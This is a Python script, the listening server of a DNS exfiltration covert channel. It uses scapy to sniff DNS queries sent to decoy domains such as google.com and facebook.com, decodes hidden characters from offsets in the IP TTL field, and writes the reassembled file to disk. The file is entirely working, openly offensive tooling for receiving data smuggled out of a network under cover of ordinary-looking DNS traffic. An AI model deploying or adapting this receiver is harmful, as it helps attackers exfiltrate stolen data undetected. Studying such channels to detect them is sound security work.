# Author: Barnabas Koh
# Date: 03-11-2024
# Description: Server for DNS Exfiltration with TTL

from scapy.all import DNS, IP, sniff
import datetime

BASE_TTL = 64
SYNC_DOMAIN = "www.google.com"
FILE_DOMAIN = "www.facebook.com"
DATA_DOMAIN = "www.gmail.com"
END_DOMAIN = "www.yahoo.com"
new_ttl = None
file_name = ""
data = ""


def save_file(file_name, data):
    """Saves 'data' into '[TIME] file'"""
    now = datetime.datetime.now()
    formatted_date = now.strftime("%d%m%Y_%H%M%S")
    with open(f"[{formatted_date}] {file_name}", 'w') as f:
        f.write(data)
    print(f"File saved as: [{formatted_date}] {file_name}")


def packet_filter(pkt):
    """Checks for SYNC, file, and DATA packets"""
    global new_ttl
    global file_name
    global data

    if not pkt.haslayer(DNS):
        return

    if pkt[DNS].qd.qname.decode()[:-1] == SYNC_DOMAIN:
        new_ttl = pkt[IP].ttl # Define the new TTL
    if pkt[DNS].qd.qname.decode()[:-1] == FILE_DOMAIN:
        char = chr(pkt[IP].ttl - new_ttl) # Extract file name
        file_name += char
    if pkt[DNS].qd.qname.decode()[:-1] == DATA_DOMAIN:
        char = chr(pkt[IP].ttl - new_ttl) # Extract data
        data += char


def stop_filter(pkt):
    """Checks for END domain"""
    if not pkt.haslayer(DNS):
        return

    if pkt[DNS].qd.qname.decode()[:-1] == END_DOMAIN:
        print(f"File received: {file_name}")
        save_file(file_name, data)
        return True


def main():
    sniff(prn=packet_filter, stop_filter=stop_filter)


if __name__ == "__main__":
    main()
